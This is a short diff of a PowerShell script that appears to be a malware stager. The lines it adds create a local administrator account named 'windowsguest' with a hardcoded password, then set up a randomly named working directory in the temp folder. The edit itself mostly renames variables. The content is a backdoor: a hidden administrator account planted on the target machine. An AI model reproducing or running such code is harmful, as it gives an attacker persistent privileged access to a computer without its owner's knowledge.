@@ -19,9 +19,6 @@ function create_account {
 
     }
 }
-$NewLocalAdmin = "windowsguest"
-$Password = (ConvertTo-SecureString "passkey1234" -AsPlainText -Force)
-create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # variables
 $wd = random_text
@@ -29,9 +26,9 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
 # create admin user
-$usertag = "windowsguest"
-$passkey = (ConvertTo-SecureString "passkey1234" -AsPlainText -Force)
-create_account -usertag $usertag -passkey $passkey
+$NewLocalAdmin = "windowsguest"
+$Password = (ConvertTo-SecureString "passkey1234" -AsPlainText -Force)
+create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # goto temp, make working directory
 mkdir $path
